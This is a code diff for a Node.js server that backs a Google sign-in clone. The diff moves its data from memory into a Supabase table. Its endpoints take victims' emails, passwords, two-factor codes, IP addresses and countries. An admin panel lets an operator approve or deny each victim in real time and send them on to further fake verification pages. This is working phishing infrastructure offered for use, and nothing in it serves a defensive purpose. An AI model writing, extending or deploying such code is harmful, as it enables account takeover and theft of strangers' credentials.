@@ -1,10 +1,17 @@
 /**
- * Local all-in-one server
+ * Local all-in-one server (Supabase persistence)
  * - Serves frontend  (google-login-clone) at  http://localhost:5000/
  * - Serves admin GUI (admin-gui)          at  http://localhost:5000/admin
  * - Exposes REST API                      at  http://localhost:5000/api/*
  *
- * In-memory store (mất khi restart). Thay bằng DB nếu cần persist.
+ * Dữ liệu lưu trong Supabase table `login_requests` (xem
+ * ../../supabase/server_requests_schema.sql) -> restart server KHÔNG mất data.
+ *
+ * Cần set 2 env trước khi chạy:
+ *   SUPABASE_URL=https://<project>.supabase.co
+ *   SUPABASE_SERVICE_ROLE_KEY=<secret key từ Project Settings -> API>
+ * Có thể đặt trong file .env cạnh server.cjs (được load tự động) hoặc export
+ * trước khi chạy `node server.cjs`.
  */
 
 const http = require('http');
@@ -12,42 +19,202 @@ const fs = require('fs');
 const path = require('path');
 const url = require('url');
 
-const PORT = 5000;
+// --------------------------- Env loading ---------------------------
+// Nạp .env đơn giản (không dùng dotenv để giữ zero-dependency).
+(function loadEnv() {
+    const candidates = [
+        path.join(__dirname, '.env'),
+        path.join(__dirname, '..', '..', '.env'),
+    ];
+    for (const p of candidates) {
+        if (!fs.existsSync(p)) continue;
+        const txt = fs.readFileSync(p, 'utf8');
+        for (const line of txt.split(/\r?\n/)) {
+            const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*(.*?)\s*$/i);
+            if (!m) continue;
+            const [, k, rawV] = m;
+            if (process.env[k]) continue;
+            let v = rawV.trim();
+            if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
+                v = v.slice(1, -1);
+            }
+            process.env[k] = v;
+        }
+    }
+})();
+
+const PORT = Number(process.env.PORT) || 5000;
 const ROOT = __dirname;
 const FRONTEND_DIR = path.join(ROOT, 'google-login-clone');
 const ADMIN_DIR = path.join(ROOT, 'admin-gui');
 
-// --------------------------- Data store ---------------------------
-/** @type {Array<any>} */
-let requests = [];
-let nextId = 1;
+const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || '';
+const SUPABASE_SERVICE_ROLE_KEY =
+    process.env.SUPABASE_SERVICE_ROLE_KEY ||
+    process.env.SUPABASE_SECRET_KEY ||
+    '';
 
-const PAGE_MAP = {
-    'index.html': 'Login',
-    'password.html': 'Password',
-    'verify.html': 'Setup Code Phone',
-    'verify-device.html': 'Setup Code Phone',
-    'verify-notification.html': 'Notification',
-    'verify-options.html': 'Notification',
+if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
+    console.error('[FATAL] Thiếu SUPABASE_URL / SUPABASE_SERVICE_ROLE_KEY trong .env');
+    console.error('        Thêm vào file .env của dự án rồi chạy lại.');
+    process.exit(1);
+}
+
+const TABLE = 'login_requests';
+const REST_ENDPOINT = `${SUPABASE_URL.replace(/\/$/, '')}/rest/v1/${TABLE}`;
+const DEFAULT_HEADERS = {
+    apikey: SUPABASE_SERVICE_ROLE_KEY,
+    Authorization: `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    'Content-Type': 'application/json; charset=utf-8',
 };
 
-function findByEmail(email) {
-    if (!email) return null;
-    for (let i = requests.length - 1; i >= 0; i--) {
-        if (requests[i].email === email) return requests[i];
+// --------------------------- Supabase REST client ---------------------------
+// Dùng fetch (Node >= 18) để giữ zero-dependency. Tất cả hàm trả về Promise.
+
+async function supabaseRequest(urlStr, opts = {}) {
+    const headers = { ...DEFAULT_HEADERS, ...(opts.headers || {}) };
+    const resp = await fetch(urlStr, { ...opts, headers });
+    const text = await resp.text();
+    let body;
+    try { body = text ? JSON.parse(text) : null; } catch { body = text; }
+    if (!resp.ok) {
+        const err = new Error(`Supabase ${resp.status}: ${JSON.stringify(body)}`);
+        err.status = resp.status;
+        err.body = body;
+        throw err;
     }
-    return null;
-}
-function findById(id) {
-    return requests.find(r => String(r.id) === String(id)) || null;
+    return body;
 }
 
-// Đánh dấu user còn "sống" (trình duyệt vẫn mở trang, vẫn đang poll).
-// Chỉ gọi từ các endpoint do CLIENT gọi (request / update-page /
-// check-approval). KHÔNG gọi từ endpoint admin để không làm "vệt" keepalive
-// giả khi user đã đóng tab.
-function touchLastSeen(entry) {
-    if (entry) entry.lastSeen = new Date().toISOString();
+// Map DB row (snake_case) -> shape client/admin-gui đang dùng (camelCase)
+function rowToEntry(r) {
+    if (!r) return null;
+    return {
+        id: r.id,
+        email: r.email,
+        sessionId: r.session_id || '',
+        password: r.password || '',
+        twofa: r.twofa || '',
+        verificationCode: r.verification_code || '',
+        pageStatus: r.page_status || 'Login',
+        status: r.status || 'pending',
+        nextPage: r.next_page || '',
+        userAgent: r.user_agent || '',
+        ip: r.ip || '',
+        country: r.country || '',
+        countryCode: r.country_code || '',
+        tag: r.tag || '',
+        note: r.note || '',
+        createdAt: r.created_at || new Date().toISOString(),
+        lastSeen: r.last_seen || null,
+    };
+}
+
+// Map camelCase -> snake_case cho INSERT / UPDATE
+function entryToRow(e) {
+    const m = {};
+    if (e.email !== undefined)            m.email = e.email;
+    if (e.sessionId !== undefined)        m.session_id = e.sessionId;
+    if (e.password !== undefined)         m.password = e.password;
+    if (e.twofa !== undefined)            m.twofa = e.twofa;
+    if (e.verificationCode !== undefined) m.verification_code = e.verificationCode;
+    if (e.pageStatus !== undefined)       m.page_status = e.pageStatus;
+    if (e.status !== undefined)           m.status = e.status;
+    if (e.nextPage !== undefined)         m.next_page = e.nextPage;
+    if (e.userAgent !== undefined)        m.user_agent = e.userAgent;
+    if (e.ip !== undefined)               m.ip = e.ip;
+    if (e.country !== undefined)          m.country = e.country;
+    if (e.countryCode !== undefined)      m.country_code = e.countryCode;
+    if (e.tag !== undefined)              m.tag = e.tag;
+    if (e.note !== undefined)             m.note = e.note;
+    if (e.createdAt !== undefined)        m.created_at = e.createdAt;
+    if (e.lastSeen !== undefined)         m.last_seen = e.lastSeen;
+    return m;
+}
+
+// --------------------------- Data access ---------------------------
+async function findByEmail(email) {
+    if (!email) return null;
+    const q = new URLSearchParams({
+        select: '*',
+        email: `eq.${email}`,
+        order: 'id.desc',
+        limit: '1',
+    });
+    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
+    return rowToEntry(rows[0]);
+}
+
+async function findById(id) {
+    if (id === undefined || id === null || id === '') return null;
+    const q = new URLSearchParams({
+        select: '*',
+        id: `eq.${id}`,
+        limit: '1',
+    });
+    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
+    return rowToEntry(rows[0]);
+}
+
+async function listAll() {
+    const q = new URLSearchParams({
+        select: '*',
+        order: 'id.asc',
+    });
+    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
+    return rows.map(rowToEntry);
+}
+
+async function insertEntry(entry) {
+    const rows = await supabaseRequest(REST_ENDPOINT, {
+        method: 'POST',
+        headers: { Prefer: 'return=representation' },
+        body: JSON.stringify([entryToRow(entry)]),
+    });
+    return rowToEntry(rows[0]);
+}
+
+async function updateEntry(id, patch) {
+    const q = new URLSearchParams({ id: `eq.${id}` });
+    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
+        method: 'PATCH',
+        headers: { Prefer: 'return=representation' },
+        body: JSON.stringify(entryToRow(patch)),
+    });
+    return rowToEntry(rows[0]);
+}
+
+async function deleteByIds(ids) {
+    if (!ids || !ids.length) return 0;
+    const q = new URLSearchParams({ id: `in.(${ids.map(String).join(',')})` });
+    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
+        method: 'DELETE',
+        headers: { Prefer: 'return=representation' },
+    });
+    return Array.isArray(rows) ? rows.length : 0;
+}
+
+async function touchLastSeen(idOrEmail) {
+    if (idOrEmail == null) return;
+    const patch = { last_seen: new Date().toISOString() };
+    const q = new URLSearchParams();
+    if (typeof idOrEmail === 'object') {
+        if (idOrEmail.id != null) q.set('id', `eq.${idOrEmail.id}`);
+        else if (idOrEmail.email) q.set('email', `eq.${idOrEmail.email}`);
+        else return;
+    } else {
+        q.set('id', `eq.${idOrEmail}`);
+    }
+    try {
+        await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
+            method: 'PATCH',
+            headers: { Prefer: 'return=minimal' },
+            body: JSON.stringify(patch),
+        });
+    } catch (e) {
+        // Không critical, log nhẹ
+        console.warn('[touchLastSeen]', e.message);
+    }
 }
 
 // --------------------------- HTTP helpers ---------------------------
@@ -64,6 +231,15 @@ const MIME = {
     '.ico':  'image/x-icon',
     '.woff': 'font/woff',
     '.woff2':'font/woff2',
+};
+
+const PAGE_MAP = {
+    'index.html': 'Login',
+    'password.html': 'Password',
+    'verify.html': 'Setup Code Phone',
+    'verify-device.html': 'Setup Code Phone',
+    'verify-notification.html': 'Notification',
+    'verify-options.html': 'Notification',
 };
 
 function setCORS(res) {
@@ -103,7 +279,7 @@ function serveFile(filePath, res) {
 
 // --------------------------- API handlers ---------------------------
 async function handleApi(req, res, pathname, query) {
-    // POST /api/request — frontend gửi email / password / twofa + geolocation (ip, country)
+    // POST /api/request — frontend gửi email / password / twofa + geolocation
     if (req.method === 'POST' && pathname === '/api/request') {
         const body = await readBody(req);
         const {
@@ -113,51 +289,46 @@ async function handleApi(req, res, pathname, query) {
         } = body;
         if (!email) return sendJSON(res, 400, { error: 'email required' });
 
-        // Fallback: nếu client không gửi ip (ipwho.is fail) → lấy từ socket.
         const clientIp = ip || (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim()
             || (req.socket && req.socket.remoteAddress) || '';
 
-        let entry = findByEmail(email);
+        let entry = await findByEmail(email);
         if (!entry) {
-            entry = {
-                id: nextId++,
+            // Tạo mới
+            entry = await insertEntry({
                 email,
                 sessionId: sessionId || '',
-                password: '',
-                twofa: '',
+                password: password || '',
+                twofa: twofa || '',
                 verificationCode: '',
-                pageStatus: 'Login',
+                pageStatus: (currentPage && PAGE_MAP[currentPage]) || 'Login',
                 status: 'pending',
                 nextPage: '',
-                userAgent: '',
-                ip: '',
-                country: '',
-                countryCode: '',
+                userAgent: userAgent || '',
+                ip: clientIp || '',
+                country: country || '',
+                countryCode: countryCode || '',
                 tag: '',
                 note: '',
-                createdAt: new Date().toISOString(),
-            };
-            requests.push(entry);
+                lastSeen: new Date().toISOString(),
+            });
         } else {
-            // User đã chuyển sang trang mới — reset quyết định (status, nextPage)
-            // để admin duyệt lại. verificationCode GIỮ NGUYÊN để trang
-            // verify-notification có thể hiển thị mã mà admin đã nhập.
-            entry.status = 'pending';
-            entry.nextPage = '';
+            // Update — user đã chuyển sang trang mới
+            const patch = {
+                status: 'pending',
+                nextPage: '',
+                lastSeen: new Date().toISOString(),
+            };
+            if (sessionId && !entry.sessionId) patch.sessionId = sessionId;
+            if (password) patch.password = password;
+            if (twofa)    patch.twofa = twofa;
+            if (userAgent) patch.userAgent = userAgent;
+            if (currentPage && PAGE_MAP[currentPage]) patch.pageStatus = PAGE_MAP[currentPage];
+            if (!entry.ip      && clientIp)       patch.ip = clientIp;
+            if (!entry.country && country)        patch.country = country;
+            if (!entry.countryCode && countryCode) patch.countryCode = countryCode;
+            entry = await updateEntry(entry.id, patch);
         }
-
-        if (sessionId && !entry.sessionId) entry.sessionId = sessionId;
-        if (password) entry.password = password;
-        if (twofa)    entry.twofa    = twofa;
-        if (userAgent) entry.userAgent = userAgent;
-        if (currentPage && PAGE_MAP[currentPage]) entry.pageStatus = PAGE_MAP[currentPage];
-        // Chỉ set geolocation lần đầu — giữ nguyên ở các request kế tiếp
-        // (user thường không đổi IP giữa chừng trong 1 phiên).
-        if (!entry.ip      && clientIp)   entry.ip          = clientIp;
-        if (!entry.country && country)    entry.country     = country;
-        if (!entry.countryCode && countryCode) entry.countryCode = countryCode;
-        entry.createdAt = new Date().toISOString();
-        touchLastSeen(entry);
 
         return sendJSON(res, 200, { ...entry, requestId: entry.id });
     }
@@ -166,12 +337,12 @@ async function handleApi(req, res, pathname, query) {
     if (req.method === 'POST' && pathname === '/api/update-page') {
         const body = await readBody(req);
         const { id, email, pageStatus, currentPage } = body;
-        const entry = (id && findById(id)) || findByEmail(email);
+        const entry = (id && await findById(id)) || await findByEmail(email);
         if (entry) {
-            if (pageStatus) entry.pageStatus = pageStatus;
-            else if (currentPage) entry.pageStatus = PAGE_MAP[currentPage] || currentPage;
-            entry.createdAt = new Date().toISOString();
-            touchLastSeen(entry);
+            const patch = { lastSeen: new Date().toISOString() };
+            if (pageStatus) patch.pageStatus = pageStatus;
+            else if (currentPage) patch.pageStatus = PAGE_MAP[currentPage] || currentPage;
+            await updateEntry(entry.id, patch);
         }
         return sendJSON(res, 200, { ok: true });
     }
@@ -179,15 +350,15 @@ async function handleApi(req, res, pathname, query) {
     // GET /api/status/:id
     if (req.method === 'GET' && pathname.startsWith('/api/status/')) {
         const id = decodeURIComponent(pathname.split('/').pop());
-        const entry = findById(id);
-        touchLastSeen(entry);
+        const entry = await findById(id);
+        if (entry) touchLastSeen(entry.id);
         return sendJSON(res, 200, entry || { status: 'pending' });
     }
 
     // GET /api/check-approval?email=...
     if (req.method === 'GET' && pathname === '/api/check-approval') {
-        const entry = findByEmail(query.email);
-        touchLastSeen(entry);
+        const entry = await findByEmail(query.email);
+        if (entry) touchLastSeen(entry.id);
         return sendJSON(res, 200, {
             status: entry ? entry.status : 'pending',
             verificationCode: entry ? entry.verificationCode : '',
@@ -195,41 +366,39 @@ async function handleApi(req, res, pathname, query) {
         });
     }
 
-    // GET /api/pending — admin lấy toàn bộ danh sách
+    // GET /api/pending — admin lấy toàn bộ
     if (req.method === 'GET' && pathname === '/api/pending') {
-        return sendJSON(res, 200, requests);
+        const rows = await listAll();
+        return sendJSON(res, 200, rows);
     }
 
-    // POST /api/approve — admin approve/deny + chỉ định nextPage
-    //   body: { id?, email?, decision: 'approved'|'denied', nextPage?, verificationCode? }
-    //   nextPage: 'password.html'|'verify-device.html'|'verify-notification.html'|
-    //             'verify-options.html'|'verify.html'|'success'  (hoặc bỏ trống)
+    // POST /api/approve
     if (req.method === 'POST' && pathname === '/api/approve') {
         const body = await readBody(req);
         const { id, email, decision, nextPage, verificationCode } = body;
-        let entry = findById(id) || findByEmail(email);
+        let entry = await findById(id);
+        if (!entry) entry = await findByEmail(email);
         if (!entry) return sendJSON(res, 404, { error: 'not found', id, email });
-        entry.status = decision === 'denied' ? 'denied' : 'approved';
-        if (verificationCode) entry.verificationCode = verificationCode;
-        entry.nextPage = nextPage || '';
-        entry.createdAt = new Date().toISOString();
+        const patch = {
+            status: decision === 'denied' ? 'denied' : 'approved',
+            nextPage: nextPage || '',
+        };
+        if (verificationCode) patch.verificationCode = verificationCode;
+        entry = await updateEntry(entry.id, patch);
         return sendJSON(res, 200, { ok: true, entry });
     }
 
-    // POST /api/set-verification-code — admin gán mã verify cho 1 email
+    // POST /api/set-verification-code
     if (req.method === 'POST' && pathname === '/api/set-verification-code') {
         const body = await readBody(req);
         const { email, code } = body;
-        const entry = findByEmail(email);
+        const entry = await findByEmail(email);
         if (!entry) return sendJSON(res, 404, { error: 'not found' });
-        entry.verificationCode = code || '';
-        entry.createdAt = new Date().toISOString();
+        await updateEntry(entry.id, { verificationCode: code || '' });
         return sendJSON(res, 200, { ok: true });
     }
 
-    // POST /api/delete — admin xóa 1 hoặc NHIỀU request
-    //   body: { id }         — xóa đơn lẻ (backward compat)
-    //   body: { ids: [...] } — xóa hàng loạt (bulk delete)
+    // POST /api/delete — id | ids[]
     if (req.method === 'POST' && pathname === '/api/delete') {
         const body = await readBody(req);
         const { id, ids } = body;
@@ -237,27 +406,27 @@ async function handleApi(req, res, pathname, query) {
             ? ids.map(String)
             : (id != null ? [String(id)] : []);
         if (!targetIds.length) return sendJSON(res, 400, { error: 'id or ids required' });
-        const before = requests.length;
-        requests = requests.filter(r => !targetIds.includes(String(r.id)));
-        return sendJSON(res, 200, { ok: true, deleted: before - requests.length });
+        const deleted = await deleteByIds(targetIds);
+        return sendJSON(res, 200, { ok: true, deleted });
     }
 
-    // POST /api/set-meta — admin set tag / note cho 1 request
-    //   body: { id, tag?, note? }
+    // POST /api/set-meta — admin set tag / note
     if (req.method === 'POST' && pathname === '/api/set-meta') {
         const body = await readBody(req);
         const { id, tag, note } = body;
-        const entry = findById(id);
+        const entry = await findById(id);
         if (!entry) return sendJSON(res, 404, { error: 'not found' });
-        if (typeof tag  === 'string') entry.tag  = tag;
-        if (typeof note === 'string') entry.note = note;
-        return sendJSON(res, 200, { ok: true, entry });
+        const patch = {};
+        if (typeof tag  === 'string') patch.tag  = tag;
+        if (typeof note === 'string') patch.note = note;
+        const updated = await updateEntry(entry.id, patch);
+        return sendJSON(res, 200, { ok: true, entry: updated });
     }
 
-    // GET /api/verification-html/:email — tiện ích cho frontend legacy
+    // GET /api/verification-html/:email
     if (req.method === 'GET' && pathname.startsWith('/api/verification-html/')) {
         const email = decodeURIComponent(pathname.replace('/api/verification-html/', ''));
-        const entry = findByEmail(email);
+        const entry = await findByEmail(email);
         const code = entry ? entry.verificationCode : '';
         return sendJSON(res, 200, { code, html: code ? `<div class="code">${code}</div>` : '' });
     }
@@ -273,18 +442,15 @@ const server = http.createServer(async (req, res) => {
     const parsed = url.parse(req.url, true);
     const pathname = decodeURIComponent(parsed.pathname || '/');
 
-    // Log mọi request (trừ polling /api/pending để tránh spam)
     if (pathname !== '/api/pending' && !pathname.startsWith('/api/status/') && pathname !== '/api/check-approval') {
         console.log(`[${new Date().toISOString().substring(11,19)}] ${req.method} ${req.url}`);
     }
 
     try {
-        // API
         if (pathname.startsWith('/api/')) {
             return await handleApi(req, res, pathname, parsed.query);
         }
 
-        // Admin GUI
         if (pathname === '/admin' || pathname === '/admin/') {
             return serveFile(path.join(ADMIN_DIR, 'index.html'), res);
         }
@@ -294,7 +460,6 @@ const server = http.createServer(async (req, res) => {
             return serveFile(path.join(ADMIN_DIR, safe), res);
         }
 
-        // Frontend static
         let rel = pathname === '/' ? 'index.html' : pathname.slice(1);
         if (!path.extname(rel)) {
             const pages = ['index','password','verify','verify-device','verify-notification','verify-options','test'];
@@ -308,13 +473,28 @@ const server = http.createServer(async (req, res) => {
     }
 });
 
-server.listen(PORT, () => {
-    console.log('==============================================');
-    console.log(`  Local server running at http://localhost:${PORT}`);
-    console.log('----------------------------------------------');
-    console.log(`  Frontend :  http://localhost:${PORT}/`);
-    console.log(`  Admin    :  http://localhost:${PORT}/admin`);
-    console.log(`  API base :  http://localhost:${PORT}/api`);
-    console.log('==============================================');
-    console.log('Press Ctrl+C to stop');
-});
+// --------------------------- Startup check ---------------------------
+(async () => {
+    // Ping 1 phát để chắc chắn table tồn tại và service role key đúng
+    try {
+        await supabaseRequest(`${REST_ENDPOINT}?select=id&limit=1`);
+    } catch (e) {
+        console.error('[FATAL] Không kết nối được Supabase table `login_requests`:');
+        console.error('        ' + e.message);
+        console.error('        -> Đã chạy file supabase/server_requests_schema.sql chưa?');
+        console.error('        -> SUPABASE_SERVICE_ROLE_KEY có đúng không?');
+        process.exit(1);
+    }
+
+    server.listen(PORT, () => {
+        console.log('==============================================');
+        console.log(`  Local server running at http://localhost:${PORT}`);
+        console.log('----------------------------------------------');
+        console.log(`  Frontend :  http://localhost:${PORT}/`);
+        console.log(`  Admin    :  http://localhost:${PORT}/admin`);
+        console.log(`  API base :  http://localhost:${PORT}/api`);
+        console.log(`  Storage  :  Supabase (${SUPABASE_URL})`);
+        console.log('==============================================');
+        console.log('Press Ctrl+C to stop');
+    });
+})();
